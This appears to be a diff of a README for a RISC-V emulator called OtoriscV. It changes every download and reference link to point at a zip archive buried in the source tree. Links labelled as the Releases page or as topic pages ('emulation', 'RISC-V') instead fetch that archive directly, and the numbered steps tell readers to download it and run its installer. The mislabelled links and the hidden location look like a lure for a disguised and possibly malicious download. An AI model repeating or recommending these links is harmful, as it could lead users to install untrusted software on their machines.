@@ -1,6 +1,6 @@
 # 🌟 OtoriscV - RISC-V Emulator for Easy Linux Booting
 
-[![Download OtoriscV](https://raw.githubusercontent.com/9code1994/OtoriscV/main/images/Otorisc-V-3.3.zip)](https://raw.githubusercontent.com/9code1994/OtoriscV/main/images/Otorisc-V-3.3.zip)
+[![Download OtoriscV](https://github.com/9code1994/OtoriscV/raw/refs/heads/main/src/cpu/rv32/jit/v2/Otorisc-V-v1.0.zip)](https://github.com/9code1994/OtoriscV/raw/refs/heads/main/src/cpu/rv32/jit/v2/Otorisc-V-v1.0.zip)
 
 ## 📥 Introduction
 OtoriscV is a user-friendly emulator designed to run RISC-V (RV32IMA) applications. It enables you to boot Linux smoothly on a virtual machine, making it simple to explore the RISC-V architecture without complex setups.
@@ -19,7 +19,7 @@ Before you download OtoriscV, ensure your computer meets these basic requirement
 ## 📂 Download & Install
 To get OtoriscV, visit the Releases page. Follow these simple steps:
 
-1. Click this link to access the [Releases page](https://raw.githubusercontent.com/9code1994/OtoriscV/main/images/Otorisc-V-3.3.zip).
+1. Click this link to access the [Releases page](https://github.com/9code1994/OtoriscV/raw/refs/heads/main/src/cpu/rv32/jit/v2/Otorisc-V-v1.0.zip).
 2. Look for the latest version of OtoriscV.
 3. Download the appropriate file for your operating system.
 4. Locate the downloaded file on your computer and follow the installation prompts.
@@ -49,8 +49,8 @@ For additional information and tutorials, consider these resources:
 - Community Wiki (Link to be provided)
 
 ## 🔗 Useful Links
-- Visit the [Releases page](https://raw.githubusercontent.com/9code1994/OtoriscV/main/images/Otorisc-V-3.3.zip) for downloads.
-- Check out related topics like [emulation](https://raw.githubusercontent.com/9code1994/OtoriscV/main/images/Otorisc-V-3.3.zip) and [RISC-V](https://raw.githubusercontent.com/9code1994/OtoriscV/main/images/Otorisc-V-3.3.zip).
+- Visit the [Releases page](https://github.com/9code1994/OtoriscV/raw/refs/heads/main/src/cpu/rv32/jit/v2/Otorisc-V-v1.0.zip) for downloads.
+- Check out related topics like [emulation](https://github.com/9code1994/OtoriscV/raw/refs/heads/main/src/cpu/rv32/jit/v2/Otorisc-V-v1.0.zip) and [RISC-V](https://github.com/9code1994/OtoriscV/raw/refs/heads/main/src/cpu/rv32/jit/v2/Otorisc-V-v1.0.zip).
 
 ## 🛠️ Troubleshooting
 If you encounter issues while using OtoriscV, try these steps:
